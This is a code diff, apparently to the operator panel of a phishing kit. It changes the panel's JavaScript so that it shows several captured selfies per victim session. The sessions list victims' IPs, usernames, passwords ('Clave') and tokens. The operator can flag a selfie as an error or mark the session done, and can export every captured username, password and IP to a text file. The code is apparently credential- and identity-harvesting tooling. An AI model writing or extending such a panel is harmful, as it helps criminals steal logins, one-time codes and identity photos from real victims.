@@ -279,11 +279,25 @@ function updateRow(tr, row) {
 
   const selfieCell = tr.querySelector('.col-selfie');
   if (selfieCell) {
-    if (row.selfie) {
+    const photos = row.selfies && row.selfies.length > 0
+      ? row.selfies
+      : (row.selfie ? [{ id: '0', photo: row.selfie, timestamp: row.updatedAt }] : []);
+
+    if (photos.length > 0) {
       selfieCell.innerHTML = `
-        <div class="selfie-cell-box" title="Clic para ver selfie de ${userStr}">
-          <img src="${row.selfie}" class="selfie-thumb" alt="Selfie" />
-          <span class="selfie-badge-tag">📸 Ver Foto</span>
+        <div class="selfie-cell-box">
+          <div class="selfie-thumbs-row">
+            ${photos.map((p, idx) => `
+              <img
+                src="${p.photo}"
+                class="selfie-thumb"
+                alt="Foto ${idx + 1}"
+                title="Clic para ver Foto #${idx + 1} de ${userStr}"
+                onclick="window.openSelfieModal('${p.photo}', '${userStr} (Foto #${idx + 1})')"
+              />
+            `).join('')}
+          </div>
+          <span class="selfie-badge-tag">${photos.length > 1 ? `📸 ${photos.length} Fotos` : '📸 Ver Foto'}</span>
         </div>
       `;
     } else if (row.state === 'waiting-selfie' || row.state === 'selfie') {
@@ -316,32 +330,53 @@ function render() {
   rowCount.textContent = String(list.length)
   emptyState.classList.toggle('is-visible', list.length === 0)
 
-  // Render Live Selfie Cards Gallery
+  // Render Live Selfie Cards Gallery (shows all received selfies, never replaces)
   const selfieSection = document.getElementById('selfieCardsSection');
   const selfieGrid = document.getElementById('selfieCardsGrid');
   const selfieCount = document.getElementById('selfieCardsCount');
-  const selfieList = list.filter(row => !!row.selfie);
+
+  const allSelfies = [];
+  list.forEach(row => {
+    const listPhotos = row.selfies && row.selfies.length > 0
+      ? row.selfies
+      : (row.selfie ? [{ id: `${row.id}_0`, photo: row.selfie, timestamp: row.updatedAt || row.createdAt }] : []);
+
+    listPhotos.forEach((item, idx) => {
+      allSelfies.push({
+        sessionId: row.id,
+        index: row.index,
+        user: row.user || `Usuario #${row.index}`,
+        photo: item.photo,
+        timestamp: item.timestamp || row.updatedAt || row.createdAt,
+        photoNum: idx + 1,
+        totalForUser: listPhotos.length,
+      });
+    });
+  });
 
   if (selfieSection && selfieGrid) {
-    if (selfieList.length > 0) {
+    if (allSelfies.length > 0) {
       selfieSection.hidden = false;
-      if (selfieCount) selfieCount.textContent = String(selfieList.length);
+      if (selfieCount) selfieCount.textContent = String(allSelfies.length);
 
       const laneNames = ['Azul', 'Verde', 'Rojo', 'Gris', 'Amarillo'];
-      selfieGrid.innerHTML = selfieList.map(row => {
-        const laneName = laneNames[laneForIndex(row.index)] || 'General';
-        const docUser = row.user || `Usuario #${row.index}`;
+      selfieGrid.innerHTML = allSelfies.map(s => {
+        const laneName = laneNames[laneForIndex(s.index)] || 'General';
+        const photoLabel = s.totalForUser > 1 ? `Foto #${s.photoNum}` : 'Foto';
         return `
-          <div class="selfie-card" data-selfie-id="${row.id}">
-            <div class="selfie-card-img-wrap" title="Clic para ampliar foto" onclick="window.openSelfieModal('${row.selfie}', '${docUser}')">
-              <img src="${row.selfie}" alt="Selfie de ${docUser}" />
+          <div class="selfie-card" data-selfie-id="${s.sessionId}">
+            <div class="selfie-card-img-wrap" title="Clic para ampliar ${photoLabel}" onclick="window.openSelfieModal('${s.photo}', '${s.user} (${photoLabel})')">
+              <img src="${s.photo}" alt="Selfie de ${s.user}" />
+              <span class="selfie-card-num-badge">${photoLabel}</span>
             </div>
-            <div class="selfie-card-user" title="${docUser}">${docUser}</div>
-            <div class="selfie-card-meta">${laneName} · ${formatTime(row.updatedAt || row.createdAt)}</div>
+            <div class="selfie-card-user" title="${s.user}">
+              ${s.user}
+            </div>
+            <div class="selfie-card-meta">${laneName} · ${formatTime(s.timestamp)}</div>
             <div class="selfie-card-actions">
-              <button type="button" class="btn btn--ok" style="background:#7c3aed; color:#fff;" onclick="window.openSelfieModal('${row.selfie}', '${docUser}')">🔍 Ver</button>
-              <button type="button" class="btn btn--error" onclick="window.setRowState('${row.id}', 'error-selfie', 'error-selfie')">❌ Err</button>
-              <button type="button" class="btn btn--done" onclick="window.setRowState('${row.id}', 'done', 'done')">✅ Listo</button>
+              <button type="button" class="btn btn--ok" style="background:#7c3aed; color:#fff;" onclick="window.openSelfieModal('${s.photo}', '${s.user} (${photoLabel})')">🔍 Ver</button>
+              <button type="button" class="btn btn--error" onclick="window.setRowState('${s.sessionId}', 'error-selfie', 'error-selfie')">❌ Err</button>
+              <button type="button" class="btn btn--done" onclick="window.setRowState('${s.sessionId}', 'done', 'done')">✅ Listo</button>
             </div>
           </div>
         `;
@@ -443,6 +478,7 @@ async function pollSessions() {
           clave: session.password || session.clave || '—',
           token: session.token || '',
           selfie: session.selfie || '',
+          selfies: session.selfies || (session.selfie ? [{ id: session.id, photo: session.selfie, timestamp: session.updatedAt || session.createdAt }] : []),
           state: session.state || 'waiting',
           online: session.online
         });
@@ -626,8 +662,8 @@ function exportToNotepad() {
     text += `IP: ${row.ip}\r\n`;
     text += `Usuario: ${row.user}\r\n`;
     text += `Clave: ${row.clave}\r\n`;
-    text += `Token: ${row.token || '—'}\r\n`;
-    text += `Selfie: ${row.selfie ? 'Recibida en panel' : 'No enviada'}\r\n`;
+    const countSelfies = row.selfies ? row.selfies.length : (row.selfie ? 1 : 0);
+    text += `Selfies: ${countSelfies > 0 ? `${countSelfies} recibida(s)` : 'No enviada'}\r\n`;
     text += `Estado final: ${statusLabel(row.state)}\r\n`;
     text += `========================\r\n\r\n`;
   });
